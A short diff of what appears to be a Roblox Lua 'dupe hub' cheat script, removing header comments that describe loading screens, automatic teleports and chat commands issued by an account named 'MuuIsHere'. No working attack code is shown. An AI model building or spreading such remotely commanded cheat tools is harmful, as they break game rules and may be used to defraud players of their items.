@@ -1,9 +1,3 @@
--- Muu Dupe Hub - FINAL VERSION (Solid Background, Auto TP to PS after 15s, 2nd Loading on Rejoin, !start/!finish)
--- 1. First loading: 15 seconds → 100% → auto TP to your private server
--- 2. On rejoin → 2nd loading (4 minutes) starts automatically
--- 3. After 2nd loading → wait for MuuIsHere !finish [yourname] → TP to public + stop script
--- 4. !start [yourname] → TP to MuuIsHere + hold E 3s × 10 times
--- Solid dark blue, big red warning, text fits buttons, chunky GUI
 
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
